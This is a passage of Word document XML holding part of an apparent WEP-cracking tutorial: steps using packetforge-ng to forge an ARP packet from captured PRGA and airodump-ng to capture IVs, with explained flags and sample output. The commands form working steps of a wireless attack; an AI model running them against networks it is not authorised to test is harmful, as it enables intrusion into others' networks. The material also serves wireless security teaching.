          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Step 4</w:t>
      </w:r>
      <w:r w:rsidR="004652D1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> - Use </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="004652D1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>packetforge-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="004652D1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> to create an </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="004652D1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="004652D1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> packet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="606895E4"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 xml:space="preserve">In the previous step, we obtained PRGA. </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>It does not matter which attack generated the PRGA</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>both are equal</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>. This PRGA is stored in the files ending with “</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>xor</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">”. We can then use this PRGA to generate a packet for injection. We will be generating an </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> packet for injection. The objective is to have the access point rebroadcast the injected </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> packet. When it rebroadcasts it, a new IV is obtained. All these new IVs will ultimately be used to crack the WEP key.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="274B41B1"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 xml:space="preserve">But first, lets generate the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> packet for injection by entering:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F5E1766" w14:textId="77777777" w:rsidR="003C6FE1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D23F26E" w14:textId="57B4975E" w:rsidR="004652D1" w:rsidRPr="008E353E" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>packetforge</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-0 -a 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 -k 255.255.255.255 -l 255.255.255.255 -y fragment-0203-180343.xor -w </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E6E87E7" w14:textId="77777777" w:rsidR="001F4FDF" w:rsidRDefault="001F4FDF" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3718123F"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Where:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3180BBC7" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>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 xml:space="preserve">-0 means generate an </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> packet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32B0804F" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>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a</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 00:14:6C:7E:40:80 is the access point MAC address</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38372753" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>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00:09:5B:EC:EE:F2 is MAC address of our card</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36EC5FB6" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>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k</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 255.255.255.255 is the destination IP (most APs respond to 255.255.255.255)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2520AAAD" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>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l</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 255.255.255.255 is the source IP (most APs respond to 255.255.255.255)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7140755A" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>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y</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> fragment-0203-180343.xor is file to read the PRGA from (NOTE: Change the file name to the actual file name out in step 4 above)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50E2FAFA" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>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w</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">-request is name of file to write the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> packet to</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EC31746"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The system will respond:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09E40C12" w14:textId="77777777" w:rsidR="008D7BBE" w:rsidRDefault="008D7BBE" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0D6092BA" w14:textId="77777777" w:rsidR="004652D1" w:rsidRPr="008D7BBE" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Wrote packet to: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D7BBE">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>-request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51609351" w14:textId="77777777" w:rsidR="001F4FDF" w:rsidRDefault="001F4FDF" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B6DE83A" w14:textId="138742B8" w:rsidR="004652D1" w:rsidRDefault="00590FC4" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Step 5</w:t>
      </w:r>
      <w:r w:rsidR="004652D1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> - Start </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="004652D1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>airodump-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="4273020A"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Open another console session to capture the generated IVs. Then enter:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06D51522" w14:textId="77777777" w:rsidR="001F4FDF" w:rsidRDefault="001F4FDF" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="512214F8" w14:textId="4CBDCDE8" w:rsidR="004652D1" w:rsidRPr="008E353E" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>airodump</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-c 9 --</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>bssid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 00:14:6C:7E:40:80 -w capture </w:t>
      </w:r>
      <w:r w:rsidR="00277615" w:rsidRPr="008E353E">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37987914" w14:textId="77777777" w:rsidR="001F4FDF" w:rsidRDefault="001F4FDF" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="238B580B"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Where:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33BD71B1" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>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c</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 9 is the channel for the wireless network</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05BF6906" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>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spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>bssid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 00:14:6C:7E:40:80 is the access point MAC address. </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>This eliminate</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> extraneous traffic.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B2CB6DE" w14:textId="77777777" w:rsidR="004652D1" w:rsidRDefault="004652D1" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>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w</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> capture is file name prefix for the file which will contain the captured </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>packets.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D701228" w14:textId="5F0BCAA2" w:rsidR="004652D1" w:rsidRPr="001F4FDF" w:rsidRDefault="00277615" w:rsidP="004652D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="25"/>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sidR="004652D1">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> is the interface name.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09FE9635" w14:textId="77777777" w:rsidR="001F4FDF" w:rsidRDefault="001F4FDF" w:rsidP="001F4FDF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="220"/>
          <w:tab w:val="left" w:pos="720"/>
        </w:tabs>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="878787"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
